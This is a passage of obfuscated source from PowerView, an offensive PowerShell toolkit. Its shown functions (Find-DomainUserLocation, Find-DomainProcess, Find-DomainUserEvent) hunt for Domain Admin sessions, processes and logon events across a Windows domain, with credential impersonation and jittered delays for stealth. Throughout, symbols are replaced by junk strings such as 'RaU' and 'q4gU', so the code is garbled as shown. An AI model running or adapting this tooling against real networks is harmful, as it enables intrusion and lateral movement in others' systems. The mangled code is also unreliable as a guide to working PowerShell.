                        if ((RaUUserName) -and (RaUUserName.Trim() -ne q4gUq4gU) -and (RaUUserName -notmatch RaUCurrentUser) -and (RaUUserName -notmatch q4gUScKjRaURaUq4gU)) {

                            if ( (-not RaUTargetUsers) -or (RaUTargetUsers -contains RaUUserName)) {
                                RaUUserLocation = New-Object PSObject
                                RaUUserLocation wZ5t Add-Member Noteproperty q4gUUserDomainq4gU RaUNull
                                RaUUserLocation wZ5t Add-Member Noteproperty q4gUUserNameq4gU RaUUserName
                                RaUUserLocation wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUTargetComputer
                                RaUUserLocation wZ5t Add-Member Noteproperty q4gUSessionFromq4gU RaUCName

                                # try to resolve the DNS hostname of RaUCname
                                try {
                                    RaUCNameDNSName = [System.Net.Dns]::GetHostEntry(RaUCName) wZ5t Select-Object -ExpandProperty HostName
                                    RaUUserLocation wZ5t Add-Member NoteProperty q4gUSessionFromNameq4gU RaUCnameDNSName
                                }
                                catch {
                                    RaUUserLocation wZ5t Add-Member NoteProperty q4gUSessionFromNameq4gU RaUNull
                                }

                                # see if weq4gUre checking to see if we have local admin access on this machine
                                if (RaUCheckAccess) {
                                    RaUAdmin = (Test-AdminAccess -ComputerName RaUCName).IsAdmin
                                    RaUUserLocation wZ5t Add-Member Noteproperty q4gULocalAdminq4gU RaUAdmin.IsAdmin
                                }
                                else {
                                    RaUUserLocation wZ5t Add-Member Noteproperty q4gULocalAdminq4gU RaUNull
                                }
                                RaUUserLocation.PSObject.TypeNames.Insert(0, q4gUPowerView.UserLocationq4gU)
                                RaUUserLocation
                            }
                        }
                    }
                    if (-not RaUStealth) {
                        # if weq4gUre not q4gUstealthyq4gU, enumerate loggedon users as well
                        RaULoggedOn = Get-NetLoggedon -ComputerName RaUTargetComputer
                        ForEach (RaUUser in RaULoggedOn) {
                            RaUUserName = RaUUser.UserName
                            RaUUserDomain = RaUUser.LogonDomain

                            # make sure wet have a result
                            if ((RaUUserName) -and (RaUUserName.trim() -ne q4gUq4gU)) {
                                if ( (-not RaUTargetUsers) -or (RaUTargetUsers -contains RaUUserName) -and (RaUUserName -notmatch q4gUScKjRaURaUq4gU)) {
                                    RaUIPAddress = @(Resolve-IPAddress -ComputerName RaUTargetComputer)[0].IPAddress
                                    RaUUserLocation = New-Object PSObject
                                    RaUUserLocation wZ5t Add-Member Noteproperty q4gUUserDomainq4gU RaUUserDomain
                                    RaUUserLocation wZ5t Add-Member Noteproperty q4gUUserNameq4gU RaUUserName
                                    RaUUserLocation wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUTargetComputer
                                    RaUUserLocation wZ5t Add-Member Noteproperty q4gUIPAddressq4gU RaUIPAddress
                                    RaUUserLocation wZ5t Add-Member Noteproperty q4gUSessionFromq4gU RaUNull
                                    RaUUserLocation wZ5t Add-Member Noteproperty q4gUSessionFromNameq4gU RaUNull

                                    # see if weq4gUre checking to see if we have local admin access on this machine
                                    if (RaUCheckAccess) {
                                        RaUAdmin = Test-AdminAccess -ComputerName RaUTargetComputer
                                        RaUUserLocation wZ5t Add-Member Noteproperty q4gULocalAdminq4gU RaUAdmin.IsAdmin
                                    }
                                    else {
                                        RaUUserLocation wZ5t Add-Member Noteproperty q4gULocalAdminq4gU RaUNull
                                    }
                                    RaUUserLocation.PSObject.TypeNames.Insert(0, q4gUPowerView.UserLocationq4gU)
                                    RaUUserLocation
                                }
                            }
                        }
                    }
                }
            }

            if (RaUTokenHandle) {
                Invoke-RevertToSelf
            }
        }

        RaULogonToken = RaUNull
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            if (RaUPSBoundParameters[q4gUDelayq4gU] -or RaUPSBoundParameters[q4gUStopOnSuccessq4gU]) {
                RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
            }
            else {
                RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (RaUPSBoundParameters[q4gUDelayq4gU] -or RaUPSBoundParameters[q4gUStopOnSuccessq4gU]) {

            Write-Verbose Oj8X[Find-DomainUserLocation] Total number of hosts: RaU(RaUTargetComputers.count)Oj8X
            Write-Verbose Oj8X[Find-DomainUserLocation] Delay: RaUDelay, Jitter: RaUJitterOj8X
            RaUCounter = 0
            RaURandNo = New-Object System.Random

            ForEach (RaUTargetComputer in RaUTargetComputers) {
                RaUCounter = RaUCounter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds RaURandNo.Next((1-RaUJitter)*RaUDelay, (1+RaUJitter)*RaUDelay)

                Write-Verbose Oj8X[Find-DomainUserLocation] Enumerating server RaUComputer (RaUCounter of RaU(RaUTargetComputers.Count))Oj8X
                Invoke-Command -ScriptBlock RaUHostEnumBlock -ArgumentList RaUTargetComputer, RaUTargetUsers, RaUCurrentUser, RaUStealth, RaULogonToken

                if (RaUResult -and RaUStopOnSuccess) {
                    Write-Verbose Oj8X[Find-DomainUserLocation] Target user found, returning earlyOj8X
                    return
                }
            }
        }
        else {
            Write-Verbose Oj8X[Find-DomainUserLocation] Using threading with threads: RaUThreadsOj8X
            Write-Verbose Oj8X[Find-DomainUserLocation] TargetComputers length: RaU(RaUTargetComputers.Length)Oj8X

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction
            RaUScriptParams = @{
                q4gUTargetUsersq4gU = RaUTargetUsers
                q4gUCurrentUserq4gU = RaUCurrentUser
                q4gUStealthq4gU = RaUStealth
                q4gUTokenHandleq4gU = RaULogonToken
            }

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction using the RaUHostEnumBlock + params
            New-ThreadedFunction -ComputerName RaUTargetComputers -ScriptBlock RaUHostEnumBlock -ScriptParameters RaUScriptParams -Threads RaUThreads
        }
    }

    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Find-DomainProcess {
<#
.SYNOPSIS

Searches for processes on the domain using WMI, returning processes
that match a particular user specification or process name.

Thanks to @paulbrandau for the approach idea.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Get-WMIProcess, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and queries the domain for users of a specified group
(default q4gUDomain Adminsq4gU) with Get-DomainGroupMember. Then for each server the
function enumerates any current processes running with Get-WMIProcess,
searching for processes running under any target user contexts or with the
specified -ProcessName. If -Credential is passed, it is passed through to
the underlying WMI commands used to enumerate the remote machines.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER Domain

Specifies the domain to query for computers AND users, defaults to the current domain.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X. Useful for OU queries.

.PARAMETER ComputerUnconstrained

Switch. Search computer objects that have unconstrained delegation.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER ProcessName

Search for processes with one or more specific names.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X. Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to q4gUDomain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with q4gU(adminCount=1)q4gU (meaning are/were privileged).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainProcess

Searches for processes run by q4gUDomain Adminsq4gU by enumerating every computer in the domain.

.EXAMPLE

Find-DomainProcess -UserAdminCount -ComputerOperatingSystem q4gUWindows 7*q4gU -Domain dev.testlab.local

Enumerates Windows 7 computers in dev.testlab.local and returns any processes being run by
privileged users in dev.testlab.local.

.EXAMPLE

Find-DomainProcess -ProcessName putty.exe

Searchings for instances of putty.exe running on the current domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Find-DomainProcess -Domain testlab.local -Credential RaUCred

Searches processes being run by q4gUdomain adminsq4gU in the testlab.local using the specified alternate credentials.

.OUTPUTS

PowerView.UserProcess
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUsePSCredentialTypeq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSAvoidUsingPlainTextForPasswordq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.UserProcessq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gUNoneq4gU)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDNSHostNameq4gU)]
        [String[]]
        RaUComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerSearchBase,

        [Alias(q4gUUnconstrainedq4gU)]
        [Switch]
        RaUComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUOperatingSystemq4gU)]
        [String]
        RaUComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUServicePackq4gU)]
        [String]
        RaUComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUSiteNameq4gU)]
        [String]
        RaUComputerSiteName,

        [Parameter(ParameterSetName = q4gUTargetProcessq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProcessName,

        [Parameter(ParameterSetName = q4gUTargetUserq4gU)]
        [Parameter(ParameterSetName = q4gUUserIdentityq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUUserIdentity,

        [Parameter(ParameterSetName = q4gUTargetUserq4gU)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUUserDomain,

        [Parameter(ParameterSetName = q4gUTargetUserq4gU)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUUserLDAPFilter,

        [Parameter(ParameterSetName = q4gUTargetUserq4gU)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUUserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUGroupNameq4gU, q4gUGroupq4gU)]
        [String[]]
        RaUUserGroupIdentity = q4gUDomain Adminsq4gU,

        [Parameter(ParameterSetName = q4gUTargetUserq4gU)]
        [Alias(q4gUAdminCountq4gU)]
        [Switch]
        RaUUserAdminCount,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaUStopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        RaUDelay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        RaUJitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        RaUThreads = 20
    )

    BEGIN {
        RaUComputerSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUdnshostnameq4gU
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUComputerSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUComputerDomainq4gU]) { RaUComputerSearcherArguments[q4gUDomainq4gU] = RaUComputerDomain }
        if (RaUPSBoundParameters[q4gUComputerLDAPFilterq4gU]) { RaUComputerSearcherArguments[q4gULDAPFilterq4gU] = RaUComputerLDAPFilter }
        if (RaUPSBoundParameters[q4gUComputerSearchBaseq4gU]) { RaUComputerSearcherArguments[q4gUSearchBaseq4gU] = RaUComputerSearchBase }
        if (RaUPSBoundParameters[q4gUUnconstrainedq4gU]) { RaUComputerSearcherArguments[q4gUUnconstrainedq4gU] = RaUUnconstrained }
        if (RaUPSBoundParameters[q4gUComputerOperatingSystemq4gU]) { RaUComputerSearcherArguments[q4gUOperatingSystemq4gU] = RaUOperatingSystem }
        if (RaUPSBoundParameters[q4gUComputerServicePackq4gU]) { RaUComputerSearcherArguments[q4gUServicePackq4gU] = RaUServicePack }
        if (RaUPSBoundParameters[q4gUComputerSiteNameq4gU]) { RaUComputerSearcherArguments[q4gUSiteNameq4gU] = RaUSiteName }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUComputerSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUComputerSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUComputerSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUComputerSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUComputerSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUComputerSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUUserSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUsamaccountnameq4gU
        }
        if (RaUPSBoundParameters[q4gUUserIdentityq4gU]) { RaUUserSearcherArguments[q4gUIdentityq4gU] = RaUUserIdentity }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUUserSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUUserDomainq4gU]) { RaUUserSearcherArguments[q4gUDomainq4gU] = RaUUserDomain }
        if (RaUPSBoundParameters[q4gUUserLDAPFilterq4gU]) { RaUUserSearcherArguments[q4gULDAPFilterq4gU] = RaUUserLDAPFilter }
        if (RaUPSBoundParameters[q4gUUserSearchBaseq4gU]) { RaUUserSearcherArguments[q4gUSearchBaseq4gU] = RaUUserSearchBase }
        if (RaUPSBoundParameters[q4gUUserAdminCountq4gU]) { RaUUserSearcherArguments[q4gUAdminCountq4gU] = RaUUserAdminCount }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUUserSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUUserSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUUserSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUUserSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUUserSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUUserSearcherArguments[q4gUCredentialq4gU] = RaUCredential }


        # first, build the set of computers to enumerate
        if (RaUPSBoundParameters[q4gUComputerNameq4gU]) {
            RaUTargetComputers = RaUComputerName
        }
        else {
            Write-Verbose q4gU[Find-DomainProcess] Querying computers in the domainq4gU
            RaUTargetComputers = Get-DomainComputer @ComputerSearcherArguments wZ5t Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose Oj8X[Find-DomainProcess] TargetComputers length: RaU(RaUTargetComputers.Length)Oj8X
        if (RaUTargetComputers.Length -eq 0) {
            throw q4gU[Find-DomainProcess] No hosts found to enumerateq4gU
        }

        # now build the user target set
        if (RaUPSBoundParameters[q4gUProcessNameq4gU]) {
            RaUTargetProcessName = @()
            ForEach (RaUT in RaUProcessName) {
                RaUTargetProcessName += RaUT.Split(q4gU,q4gU)
            }
            if (RaUTargetProcessName -isnot [System.Array]) {
                RaUTargetProcessName = [String[]] @(RaUTargetProcessName)
            }
        }
        elseif (RaUPSBoundParameters[q4gUUserIdentityq4gU] -or RaUPSBoundParameters[q4gUUserLDAPFilterq4gU] -or RaUPSBoundParameters[q4gUUserSearchBaseq4gU] -or RaUPSBoundParameters[q4gUUserAdminCountq4gU] -or RaUPSBoundParameters[q4gUUserAllowDelegationq4gU]) {
            RaUTargetUsers = Get-DomainUser @UserSearcherArguments wZ5t Select-Object -ExpandProperty samaccountname
        }
        else {
            RaUGroupSearcherArguments = @{
                q4gUIdentityq4gU = RaUUserGroupIdentity
                q4gURecurseq4gU = RaUTrue
            }
            if (RaUPSBoundParameters[q4gUUserDomainq4gU]) { RaUGroupSearcherArguments[q4gUDomainq4gU] = RaUUserDomain }
            if (RaUPSBoundParameters[q4gUUserSearchBaseq4gU]) { RaUGroupSearcherArguments[q4gUSearchBaseq4gU] = RaUUserSearchBase }
            if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUGroupSearcherArguments[q4gUServerq4gU] = RaUServer }
            if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUGroupSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
            if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUGroupSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
            if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUGroupSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
            if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUGroupSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUGroupSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
            RaUGroupSearcherArguments
            RaUTargetUsers = Get-DomainGroupMember @GroupSearcherArguments wZ5t Select-Object -ExpandProperty MemberName
        }

        # the host enumeration block weq4gUre using to enumerate all servers
        RaUHostEnumBlock = {
            Param(RaUComputerName, RaUProcessName, RaUTargetUsers, RaUCredential)

            ForEach (RaUTargetComputer in RaUComputerName) {
                RaUUp = Test-Connection -Count 1 -Quiet -ComputerName RaUTargetComputer
                if (RaUUp) {
                    # try to enumerate all active processes on the remote host
                    # and search for a specific process name
                    if (RaUCredential) {
                        RaUProcesses = Get-WMIProcess -Credential RaUCredential -ComputerName RaUTargetComputer -ErrorAction SilentlyContinue
                    }
                    else {
                        RaUProcesses = Get-WMIProcess -ComputerName RaUTargetComputer -ErrorAction SilentlyContinue
                    }
                    ForEach (RaUProcess in RaUProcesses) {
                        # if weq4gUre hunting for a process name or comma-separated names
                        if (RaUProcessName) {
                            if (RaUProcessName -Contains RaUProcess.ProcessName) {
                                RaUProcess
                            }
                        }
                        # if the session user is in the target list, display some output
                        elseif (RaUTargetUsers -Contains RaUProcess.User) {
                            RaUProcess
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (RaUPSBoundParameters[q4gUDelayq4gU] -or RaUPSBoundParameters[q4gUStopOnSuccessq4gU]) {

            Write-Verbose Oj8X[Find-DomainProcess] Total number of hosts: RaU(RaUTargetComputers.count)Oj8X
            Write-Verbose Oj8X[Find-DomainProcess] Delay: RaUDelay, Jitter: RaUJitterOj8X
            RaUCounter = 0
            RaURandNo = New-Object System.Random

            ForEach (RaUTargetComputer in RaUTargetComputers) {
                RaUCounter = RaUCounter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds RaURandNo.Next((1-RaUJitter)*RaUDelay, (1+RaUJitter)*RaUDelay)

                Write-Verbose Oj8X[Find-DomainProcess] Enumerating server RaUTargetComputer (RaUCounter of RaU(RaUTargetComputers.count))Oj8X
                RaUResult = Invoke-Command -ScriptBlock RaUHostEnumBlock -ArgumentList RaUTargetComputer, RaUTargetProcessName, RaUTargetUsers, RaUCredential
                RaUResult

                if (RaUResult -and RaUStopOnSuccess) {
                    Write-Verbose Oj8X[Find-DomainProcess] Target user found, returning earlyOj8X
                    return
                }
            }
        }
        else {
            Write-Verbose Oj8X[Find-DomainProcess] Using threading with threads: RaUThreadsOj8X

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction
            RaUScriptParams = @{
                q4gUProcessNameq4gU = RaUTargetProcessName
                q4gUTargetUsersq4gU = RaUTargetUsers
                q4gUCredentialq4gU = RaUCredential
            }

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction using the RaUHostEnumBlock + params
            New-ThreadedFunction -ComputerName RaUTargetComputers -ScriptBlock RaUHostEnumBlock -ScriptParameters RaUScriptParams -Threads RaUThreads
        }
    }
}


function Find-DomainUserEvent {
<#
.SYNOPSIS

Finds logon events on the current (or remote domain) for the specified users.

Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainUser, Get-DomainGroupMember, Get-DomainController, Get-DomainUserEvent, New-ThreadedFunction  

.DESCRIPTION

Enumerates all domain controllers from the specified -Domain
(default of the local domain) using Get-DomainController, enumerates
the logon events for each using Get-DomainUserEvent, and filters
the results based on the targeting criteria.

.PARAMETER ComputerName

Specifies an explicit computer name to retrieve events from.

.PARAMETER Domain

Specifies a domain to query for domain controllers to enumerate.
Defaults to the current domain.

.PARAMETER Filter

A hashtable of PowerView.LogonEvent properties to filter for.
The q4gUopwZ5toperatorwZ5toperationq4gU clause can have q4gU&q4gU, q4gUwZ5tq4gU, q4gUandq4gU, or q4gUorq4gU,
and is q4gUorq4gU by default, meaning at least one clause matches instead of all.
See the exaples for usage.

.PARAMETER StartTime

The [DateTime] object representing the start of when to collect events.
Default of [DateTime]::Now.AddDays(-1).

.PARAMETER EndTime

The [DateTime] object representing the end of when to collect events.
Default of [DateTime]::Now.

.PARAMETER MaxEvents

The maximum number of events (per host) to retrieve. Default of 5000.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X. Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to q4gUDomain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with q4gU(adminCount=1)q4gU (meaning are/were privileged).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target computer(s).

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainUserEvent

Search for any user events matching domain admins on every DC in the current domain.

.EXAMPLE

RaUcred = Get-Credential devScKjadministrator
Find-DomainUserEvent -ComputerName q4gUsecondary.dev.testlab.localq4gU -UserIdentity q4gUjohnq4gU

Search for any user events matching the user q4gUjohnq4gU on the q4gUsecondary.dev.testlab.localq4gU
domain controller using the alternate credential

.EXAMPLE

q4gUprimary.testlab.local wZ5t Find-DomainUserEvent -Filter @{q4gUIpAddressq4gU=q4gU192.168.52.200wZ5t192.168.52.201q4gU}

Find user events on the primary.testlab.local system where the event matches
the IPAddress q4gU192.168.52.200q4gU or q4gU192.168.52.201q4gU.

.EXAMPLE

RaUcred = Get-Credential testlabScKjadministrator
Find-DomainUserEvent -Delay 1 -Filter @{q4gULogonGuidq4gU=q4gUb8458aa9-b36e-eaa1-96e0-4551000fdb19q4gU; q4gUTargetLogonIdq4gU = q4gU10238128q4gU; q4gUopq4gU=q4gU&q4gU}

Find user events mathing the specified GUID AND the specified TargetLogonId, searching
through every domain controller in the current domain, enumerating each DC in serial
instead of in a threaded manner, using the alternate credential.

.OUTPUTS

PowerView.LogonEvent

PowerView.ExplicitCredentialLogon

.LINK

http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseDeclaredVarsMoreThanAssignmentsq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUsePSCredentialTypeq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSAvoidUsingPlainTextForPasswordq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.LogonEventq4gU)]
    [OutputType(q4gUPowerView.ExplicitCredentialLogonq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gUDomainq4gU)]
    Param(
        [Parameter(ParameterSetName = q4gUComputerNameq4gU, Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUdnshostnameq4gU, q4gUHostNameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName,

        [Parameter(ParameterSetName = q4gUDomainq4gU)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        RaUFilter,

        [Parameter(ValueFromPipelineByPropertyName = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        RaUStartTime = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        RaUEndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        RaUMaxEvents = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUUserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUUserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUUserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUUserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUGroupNameq4gU, q4gUGroupq4gU)]
        [String[]]
        RaUUserGroupIdentity = q4gUDomain Adminsq4gU,

        [Alias(q4gUAdminCountq4gU)]
        [Switch]
        RaUUserAdminCount,

        [Switch]
        RaUCheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaUStopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        RaUDelay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        RaUJitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        RaUThreads = 20
    )

    BEGIN {
        RaUUserSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUsamaccountnameq4gU
        }
